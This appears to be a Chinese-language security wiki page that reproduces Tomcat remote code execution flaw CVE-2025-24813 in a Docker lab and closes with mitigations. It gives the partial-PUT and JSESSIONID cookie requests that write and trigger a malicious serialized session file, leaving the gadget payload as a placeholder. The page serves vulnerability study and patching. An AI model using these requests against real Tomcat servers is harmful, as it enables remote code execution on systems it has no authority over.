<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-24813/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Tomcat 远程代码执行漏洞 CVE-2025-24813 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Tomcat \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2025-24813", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_3" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
              {title: "\u6f0f\u6d1e\u4fee\u590d", url: "#_5" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Tomcat8%20%E5%BC%B1%E5%8F%A3%E4%BB%A4%2B%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Tomcat8%20%E5%BC%B1%E5%8F%A3%E4%BB%A4%2B%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Tomcat8 弱口令+后台getshell漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Supervisord%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-11610/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Supervisord%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-11610/" class="btn btn-xs btn-link">
        Supervisord 远程命令执行漏洞 CVE-2017-11610
      </a>
    </div>
    
  </div>

    

    <h1 id="tomcat-cve-2025-24813">Tomcat 远程代码执行漏洞 CVE-2025-24813<a class="headerlink" href="#tomcat-cve-2025-24813" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Apache Tomcat 是一个开源的 Java Servlet 容器和 Web 服务器，支持运行 Java Servlet、JavaServer Pages (JSP) 和其他基于 Java 的 Web 应用程序，广泛用于开发和部署企业级 Web 应用。</p>
<p>该漏洞源于 Tomcat DefaultServlet 处理 partial PUT 请求（基于 <code>Content-Range</code> 头的 HTTP PUT 请求）时的临时文件命名逻辑不安全，导致攻击者可以通过构造特殊的请求路径，访问或写入安全敏感文件。</p>
<p>满足以下条件，攻击者可以访问或修改安全敏感文件：</p>
<ol>
<li>DefaultServlet 启用了写入权限（默认情况下禁用）。</li>
<li>服务器启用了 partial PUT（默认启用）。</li>
<li>该敏感文件存放在允许上传的目录的子路径（攻击者需要能够在该敏感文件目录上级路径使用 partial PUT 上传文件）</li>
<li>攻击者已知目标敏感文件的路径以及文件名。</li>
<li>敏感文件是通过 partial PUT 上传的。</li>
</ol>
<p>满足以下条件，攻击者可以远程代码执行（RCE）：</p>
<ol>
<li>DefaultServlet 启用了写入权限（默认情况下禁用）。</li>
<li>服务器启用了 partial PUT（默认启用）。</li>
<li>Tomcat 使用了基于文件的 Session 持久化机制（非默认配置，默认为基于内存持久化），且存储位置为默认路径。</li>
<li>应用程序包含可利用的反序列化漏洞库（如 Commons-Collections 3.x）。</li>
</ol>
<p>参考链接：</p>
<ul>
<li><a href="https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq">https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq</a></li>
<li><a href="https://github.com/charis3306/CVE-2025-24813">https://github.com/charis3306/CVE-2025-24813</a></li>
<li><a href="https://forum.butian.net/article/674">https://forum.butian.net/article/674</a></li>
</ul>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>11.0.0-M1 ≤ Apache Tomcat ≤ 11.0.2
10.1.0-M1 ≤ Apache Tomcat ≤ 10.1.34
9.0.0.M1 ≤ Apache Tomcat ≤ 9.0.98
</code></pre></div>
<h2 id="_3">环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>Vulhub 执行以下命令启动存在漏洞的 Tomcat 9.0.97 服务器：</p>
<div class="highlight"><pre><span></span><code>docker compose build
docker compose up -d
</code></pre></div>
<p>服务启动后，访问 <code>http://your-ip:8080</code> 即可看到 Tomcat 的示例页面。</p>
<p><img alt="" src="../images/Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-24813/image-20250317103255175.png" /></p>
<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p><code>Content-Range</code> 在 Tomcat 的 HTTP PUT 请求中主要用于实现大文件的分块传输。在文件上传未完成的情况下，内容会被临时存储在 Tomcat 的工作目录：<code>$CATALINA_BASE/work/Catalina/localhost/ROOT</code>。</p>
<p>当发送不完全的 PUT 请求（使用 <code>Content-Range</code> 头）时，Tomcat 会将文件路径中的分隔符 (<code>/</code>) 转换为句点 (<code>.</code>)，并将文件临时存储在会话存储目录中，例如：访问 <code>/xxxxx/session</code> 会被解析为 <code>.xxxxx.session</code>。</p>
<p>该漏洞存在的原因是 Tomcat 中两个关键的错误配置。首先，在 <code>conf/web.xml</code> 中，DefaultServlet 配置了 <code>readonly=false</code>，允许文件上传：</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;servlet&gt;</span>
<span class="w">    </span><span class="nt">&lt;servlet-name&gt;</span>default<span class="nt">&lt;/servlet-name&gt;</span>
<span class="w">    </span><span class="nt">&lt;servlet-class&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class="nt">&lt;/servlet-class&gt;</span>
<span class="w">    </span><span class="nt">&lt;init-param&gt;</span>
<span class="w">        </span><span class="nt">&lt;param-name&gt;</span>debug<span class="nt">&lt;/param-name&gt;</span>
<span class="w">        </span><span class="nt">&lt;param-value&gt;</span>0<span class="nt">&lt;/param-value&gt;</span>
<span class="w">    </span><span class="nt">&lt;/init-param&gt;</span>
<span class="w">    </span><span class="nt">&lt;init-param&gt;</span>
<span class="w">        </span><span class="nt">&lt;param-name&gt;</span>listings<span class="nt">&lt;/param-name&gt;</span>
<span class="w">        </span><span class="nt">&lt;param-value&gt;</span>false<span class="nt">&lt;/param-value&gt;</span>
<span class="w">    </span><span class="nt">&lt;/init-param&gt;</span>
<span class="w">    </span><span class="nt">&lt;init-param&gt;</span>
<span class="w">        </span><span class="nt">&lt;param-name&gt;</span>readonly<span class="nt">&lt;/param-name&gt;</span>
<span class="w">        </span><span class="nt">&lt;param-value&gt;</span>false<span class="nt">&lt;/param-value&gt;</span>
<span class="w">    </span><span class="nt">&lt;/init-param&gt;</span>
<span class="w">    </span><span class="nt">&lt;load-on-startup&gt;</span>1<span class="nt">&lt;/load-on-startup&gt;</span>
<span class="nt">&lt;/servlet&gt;</span>
</code></pre></div>
<p>其次，在 <code>conf/context.xml</code> 中，Tomcat 配置了基于文件的 Session 持久化：</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;Manager</span><span class="w"> </span><span class="na">className=</span><span class="s">&quot;org.apache.catalina.session.PersistentManager&quot;</span><span class="nt">&gt;</span>
<span class="w">    </span><span class="nt">&lt;Store</span><span class="w"> </span><span class="na">className=</span><span class="s">&quot;org.apache.catalina.session.FileStore&quot;</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/Manager&gt;</span>
</code></pre></div>
<p>这两种配置都使用相同的默认存储路径：<code>$CATALINA_BASE/work/Catalina/localhost/ROOT</code>。</p>
<h3 id="urldns">URLDNS<a class="headerlink" href="#urldns" title="Permanent link">&para;</a></h3>
<p>我们先用 URLDNS gadget 进行测试。发送带有 Content-Range 头的部分 PUT 请求，在临时目录 <code>$CATALINA_BASE/work/Catalina/localhost/ROOT</code> 中写入名为 <code>.deserialize.session</code> 的文件：</p>
<div class="highlight"><pre><span></span><code>PUT /deserialize/session HTTP/1.1
Host: your-ip:8080
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6788.76 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: application/data
Content-Length: 1000
Content-Range: bytes 0-1000/1200

YOUR-PAYLOAD-HERE
</code></pre></div>
<p><img alt="" src="../images/Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-24813/image-20250317114226744.png" /></p>
<p>可以看到，文件 <code>.deserialize.session</code> 已经被写入：</p>
<p><img alt="" src="../images/Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-24813/image-20250317140742989.png" /></p>
<p>然后，发送另一个带有 JSESSIONID cookie 的请求，触发文件 <code>.deserialize.session</code> 的反序列化：</p>
<div class="highlight"><pre><span></span><code>GET / HTTP/1.1
Host: your-ip:8080
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6788.76 Safari/537.36
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=.deserialize 
</code></pre></div>
<p><img alt="" src="../images/Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-24813/image-20250317114246305.png" /></p>
<p>URLDNS gadget 被成功反序列化，并发送了 DNS 请求：</p>
<p><img alt="" src="../images/Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-24813/image-20250317112514451.png" /></p>
<h3 id="commonscollectionsk1">CommonsCollectionsK1<a class="headerlink" href="#commonscollectionsk1" title="Permanent link">&para;</a></h3>
<p>回顾一下远程代码执行（RCE）的利用过程：</p>
<ol>
<li>DefaultServlet 配置了 <code>readonly=false</code>，允许文件上传。</li>
<li>服务器默认启用了 partial PUT。</li>
<li>Tomcat 配置了基于文件的 Session 持久化，且存储位置为默认路径 <code>$CATALINA_BASE/work/Catalina/localhost/ROOT</code>。</li>
<li>应用程序存在反序列化利用链，在临时目录中写入包含恶意反序列化数据的文件。</li>
<li>设置 <code>JSESSIONID=.xxxxx</code> 触发漏洞。</li>
</ol>
<p>我们修改 docker-compose.yml，引入 <code>commons-collections-3.2.1</code>：</p>
<div class="highlight"><pre><span></span><code>services:
 tomcat:
   build: .
   volumes:
     - ./commons-collections-3.2.1.jar:/usr/local/tomcat/webapps/ROOT/WEB-INF/lib/commons-collections-3.2.1.jar
   ports:
    - &quot;8080:8080&quot;
</code></pre></div>
<p>重新启动服务：</p>
<div class="highlight"><pre><span></span><code>docker compose up --force-recreate
</code></pre></div>
<p>用 <a href="https://github.com/vulhub/java-chains">java-chains</a> 生成 payload：</p>
<p><img alt="" src="../images/Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-24813/image-20250317142046832.png" /></p>
<p>发送带有 Content-Range 头的部分 PUT 请求，在临时目录 <code>$CATALINA_BASE/work/Catalina/localhost/ROOT</code> 中写入名为 <code>.poc.session</code> 的文件：</p>
<div class="highlight"><pre><span></span><code>PUT /poc/session HTTP/1.1
Host: your-ip:8080
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6788.76 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: application/data
Content-Length: 1000
Content-Range: bytes 0-1000/1200

YOUR-PAYLOAD-HERE
</code></pre></div>
<p><img alt="" src="../images/Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-24813/image-20250317141540103.png" /></p>
<p>可以看到，文件 <code>.poc.session</code> 已经被写入：</p>
<p><img alt="" src="../images/Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-24813/image-20250317141613972.png" /></p>
<div class="highlight"><pre><span></span><code>GET / HTTP/1.1
Host: your-ip:8080
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6788.76 Safari/537.36
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=.poc
</code></pre></div>
<p><img alt="" src="../images/Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-24813/image-20250317141703769.png" /></p>
<p>CommonsCollectionsK1 gadget 被成功序列化，执行了 <code>touch /tmp/awesome_poc</code> 命令：</p>
<p><img alt="" src="../images/Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-24813/image-20250317141811798.png" /></p>
<h2 id="_5">漏洞修复<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
<h3 id="_6">临时缓解方案<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<p>如果暂时无法升级，可以采取以下临时措施降低风险：</p>
<ul>
<li>禁止 partial PUT：在 conf/web.xml 中修改 allowPartialPut 参数为 false，并 重启 Tomcat 以使配置生效。</li>
<li>严格控制 DefaultServlet 写入权限：确保 readonly=true，禁用所有未经授权的 PUT/DELETE 请求，仅允许可信来源访问受限目录。</li>
</ul>
<h3 id="_7">通用修补建议<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<ul>
<li>升级至 <a href="https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq">安全版本</a> Apache Tomcat ≥ 11.0.3、Apache Tomcat ≥10.1.35、 Apache Tomcat ≥ 9.0.99。</li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Tomcat8%20%E5%BC%B1%E5%8F%A3%E4%BB%A4%2B%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Tomcat8%20%E5%BC%B1%E5%8F%A3%E4%BB%A4%2B%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Tomcat8 弱口令+后台getshell漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Supervisord%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-11610/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Supervisord%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-11610/" class="btn btn-xs btn-link">
        Supervisord 远程命令执行漏洞 CVE-2017-11610
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>